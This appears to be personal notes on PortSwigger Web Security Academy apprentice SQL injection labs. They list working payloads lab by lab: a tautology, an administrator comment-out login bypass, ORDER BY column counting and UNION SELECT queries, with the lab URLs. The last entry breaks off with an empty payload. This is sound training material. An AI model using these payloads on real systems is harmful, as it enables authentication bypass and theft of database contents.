# Important Notes
* If it's oracle, you need to make sure that you select from dual, i.e.
```' UNION SELECT NULL FROM DUAL--```
* On 
"MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment."

# Apprentice
## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Background: display all products of any category
Payload: https://ac171fc21e837c23c0e34afc00d300f9.web-security-academy.net/filter?category=Accessories%27+or+%271%27=%271
tldr: ' or '1'='1

## Lab: SQL injection vulnerability allowing login bypass
Background: Login as administrator
Payload: username set to on the login page: administrator'-- 

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
Background: it's in category again and we just need to count the columns with a union select
First run a query, comment the rest of the line to confirm it works (else you will get an internal server error)
This works: GET /filter?category=1'+-- 

**There's a few options:**

https://ac911fe71e9eb3afc0b54717000f0026.web-security-academy.net/filter?category=1'order+by+3-- 

Increment the order by starting by 1, the table has 3 columns, so we use:

```1' order by 3 ```

https://ac911fe71e9eb3afc0b54717000f0026.web-security-academy.net/filter?category=1'+union+all+select+'1','2','3'--

```1' union all select '1','2', '3'--```

Note, for some dumb reason, it doesn't allow you to complete the lab unless you use "null" instead of strings even though the other query works.

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
Background: make the db return "FukClL" I just did a normal union select 1,2,3 then got an error so changed the one at a time to strings with a single quote and 2 was printed on the page. 
Payload: /filter?category='+union+select+1,'FukClL',3--

## Lab: SQL injection UNION attack, retrieving data from other tables
Background: retrieve username and password from users table
Payload: 
